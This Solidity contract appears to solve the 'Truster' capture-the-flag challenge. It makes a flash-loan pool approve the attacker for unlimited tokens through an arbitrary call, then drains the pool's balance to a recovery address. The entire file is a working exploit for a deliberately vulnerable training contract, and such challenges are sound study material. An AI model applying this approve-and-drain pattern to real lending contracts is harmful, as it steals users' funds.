// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {SafeTransferLib, ERC4626, ERC20} from "solmate/tokens/ERC4626.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {ERC20} from "solmate/tokens/ERC20.sol";

contract TrusterAttacker {
    using SafeTransferLib for DamnValuableToken;
    constructor(){

    }
    function attack(address pool, address recovery) public {
        DamnValuableToken token = TrusterLenderPool(pool).token();
        TrusterLenderPool(pool).flashLoan(
            0,
            address (this),
            address(token),
            abi.encodeCall(ERC20.approve, (address(this), type(uint256).max))
        );
        token.safeTransferFrom(pool, recovery, token.balanceOf(pool));
    }
}
